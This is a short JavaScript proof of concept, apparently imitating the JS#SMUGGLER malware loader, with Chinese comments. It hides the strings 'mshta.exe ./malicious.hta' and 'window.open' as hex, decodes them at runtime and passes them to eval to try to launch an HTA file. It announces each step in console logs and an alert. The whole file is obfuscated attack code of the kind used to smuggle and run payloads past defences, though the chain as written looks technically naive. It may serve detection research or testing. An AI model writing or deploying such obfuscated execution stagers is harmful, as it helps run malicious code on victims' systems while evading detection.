const encryptDict = {
    "k9": "6d736874612e657865202e2f6d616c6963696f75732e687461", // mshta.exe ./malicious.hta
    "k10": "77696e646f772e6f70656e", // window.open
    "k11": "2c2027546f6f6c426172272c20302c2030" // , 'ToolBar', 0, 0
  };
  
  function dec(s) {
    let res = "";
    for (let i = 0; i < s.length; i += 2) {
      res += String.fromCharCode(parseInt(s.substr(i, 2), 16));
    }
    return res;
  }
  
  // 新增控制台日志
  console.log("[JS#SMUGGLER POC] 恶意脚本解密完成");
  const htaCmd = dec(encryptDict.k9);
  console.log(`[JS#SMUGGLER POC] 构建 HTA 执行命令：${htaCmd}`);
  
  // 执行 HTA
  eval(dec(encryptDict.k10) + "('" + htaCmd + "'" + dec(encryptDict.k11) + ")");
  
  // 弹窗提示
  alert("[POC 测试] 恶意脚本已加载，正在执行 HTA 文件...");